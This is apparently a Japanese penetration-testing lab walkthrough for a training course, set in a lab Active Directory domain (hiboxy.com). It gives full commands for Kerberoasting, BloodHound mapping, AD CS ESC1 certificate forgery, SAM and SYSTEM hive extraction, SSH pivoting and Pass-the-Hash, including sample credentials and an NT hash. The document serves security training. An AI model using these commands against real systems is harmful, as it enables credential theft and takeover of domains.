# Lab4 Walkthrough

提供された資料に基づく、SEC560のセクション4（ドメイン特権昇格とラテラルムーブメント）のウォークスルー（手順書）です。このセクションでは、Active Directory環境に特有の認証メカニズム（Kerberos）や証明書サービス（AD CS）の脆弱性を突き、一般ユーザーからドメイン管理者（Domain Admin）へと権限を昇格させ、横展開（ラテラルムーブメント）を行う手法を学習します。

---

### Lab 4.1: Kerberoasting (ケルベロスティング)

**目的:** サービスアカウント（SPN）に紐づくサービスチケットを要求し、取得したハッシュをオフラインでクラックしてパスワードを取得します。

**ステップ 1: チケットの列挙と要求**

- Impacketの`GetUserSPNs.py`を使用して、SPNが設定されたユーザーアカウントを特定し、RC4で暗号化されたサービスチケットを抽出して保存します。
    
    ```
    GetUserSPNs.py hiboxy.com/bgreen:Password1 -request -dc-ip 10.130.10.4 | tee /tmp/spns.output
    ```
    
    _※出力結果から `$krb5tgs$23$` で始まる行（例: `SVC_SQLService2`）を別のテキストファイルに保存します。_

**ステップ 2: Hashcatによるオフラインクラック**

- 保存したハッシュファイルを対象に、Hashcat（モード13100）を用いてパスワードをクラックします。
    
    ```
    hashcat -m 13100 hashes.txt wordlist.txt
    ```
    

**ステップ 3: 権限の確認**

- クラックして得たパスワード（例: `SVC_SQLService2` / `^Cakemaker`）を使用して、`wmiexec.py`でドメインコントローラー（DC）に接続し、ドメイン管理者権限があることを確認します。

---

### Lab 4.2: BloodHound

**目的:** Active Directory内の権限関係を収集し、BloodHoundのグラフネットワーク分析を用いてドメイン管理者への「最短攻撃パス」を見つけ出します。

**ステップ 1: データの収集 (Ingestion)**

- Linux VMから`bloodhound-python`または`rusthound`を実行し、ドメイン全体の情報をJSON/ZIP形式で収集します。
    
    ```
    bloodhound-python -d hiboxy.com -u bgreen -p Password1 -c All -ns 10.130.10.4
    ```
    
    _※Kerberoast可能なユーザーを含めるため、必ず`-c All`（全収集）オプションを指定します。_

**ステップ 2: UIでの分析**

- Neo4jサービスを起動し、BloodHound GUIにログインします。
- 収集したデータをアップロードし、組み込みクエリから **「Shortest Paths to Domain Admins from Kerberoastable Users（Kerberoast可能なユーザーからドメイン管理者への最短経路）」** を実行します。
- これにより、Lab 4.1でクラックしたアカウントがドメイン管理者権限へ直接繋がっていることなどを視覚的に確認できます。

---

### Lab 4.3: AD CS攻撃 (ESC1)

**目的:** Active Directory Certificate Services (AD CS) の設定ミス（ESC1）を突き、ドメイン管理者の証明書を不正に発行させます。

**ステップ 1: 脆弱なテンプレートの発見**

- `certipy`ツールを使用して、ドメイン内の脆弱なCA（認証局）とテンプレートを特定します。
    
    ```
    certipy find -u bgreen@hiboxy.com -p Password1 -dc-ip 10.130.10.4
    ```
    
    _※出力結果から、`ENROLLEE_SUPPLIES_SUBJECT`（申請者が任意のSANを指定可能）が有効で、クライアント認証に利用できるテンプレート（例: `UserAuthenticationCertificate`）を見つけます。_

**ステップ 2: 証明書の要求とハッシュの抽出**

- `certipy req`コマンドで、低権限ユーザー（`bgreen`）からドメイン管理者（`Administrator`）をSANに指定して証明書（.pfx）を要求します。
    
    ```
    certipy req -username bgreen@hiboxy.com -password Password1 -ca hiboxy-CA01-CA -template UserAuthenticationCertificate -upn administrator@hiboxy.com -sid "<AdministratorのSID>" -target ca01.hiboxy.com
    ```
    
- 取得した証明書を使って`certipy auth`を実行し、AdministratorのNTハッシュやTGTを抽出します。

---

### Lab 4.4 / 4.5: ラテラルムーブメント (Windows & Linux)

**目的:** 侵害したシステムを踏み台にして、ネットワーク内の他のシステム（隔離されたセグメント等）へ横展開します。

- **Windowsからの展開:** WMI（`wmic`）を使用してリモートホストのプロセスを起動したり、`reg save`コマンドをリモート実行してSAMやSYSTEMハイブのバックアップを取得し、クレデンシャルを抽出する準備を整えます。
- **Linuxからの展開:** SSHのポートフォワーディング（ダイナミック/ローカル）を活用し、アクセスできない内部サブネット（例: `10.130.11.0/24`）のSMBやSQLポートへトラフィックをトンネリングしてピボット攻撃を行います。

---

### Lab 4.6: Impacketツールの活用

**目的:** Linux環境からWindowsプロトコルを操るImpacketツール群の動作の違いを理解し、使い分けます。

- **`wmiexec.py`**: DCOM/WMIを利用。エージェントをアップロードせず、管理者権限で動作します。痕跡が少なく隠密性が高いのが特徴です。
- **`smbexec.py`**: SMBを利用。SYSTEM権限で動作しますが、一時的なサービスを作成するためイベントログに検知されやすい痕跡が残ります。
- **`smbclient.py`**: 共有フォルダへの対話的なアクセスや、ファイルのアップロード/ダウンロードに使用します。
- **`lookupsid.py`**: ドメイン全体のSIDをブルートフォースし、全ユーザーとグループのリストを抽出します（パスワード推測の辞書作成に有用）。

---

### Lab 4.7: C2ピボットとPass-the-Hash

**目的:** パスワードをクラックせずに、取得したNTハッシュをそのまま認証に使用してシステムを侵害します。

**ステップ 1: Pass-the-Hash (PtH) の実行**

- 抽出したローカル管理者のハッシュを使い、Impacketの`psexec.py`などで横展開を行います。`-hashes`オプションでLMハッシュとNTハッシュをコロン区切りで指定します。
    
    ```
    psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e hiboxy/antivirus@10.130.10.21 cmd.exe
    ```
    

**ステップ 2: Overpass-the-Hash (Rubeus)**

- Windows環境では、Rubeusを使用してハッシュからTGTを要求し（Pass-the-Key/Overpass-the-Hash）、現在のログオンセッションのメモリに注入（`/ptt`）することで、以後のKerberos通信を対象ユーザーの権限で行うことができます。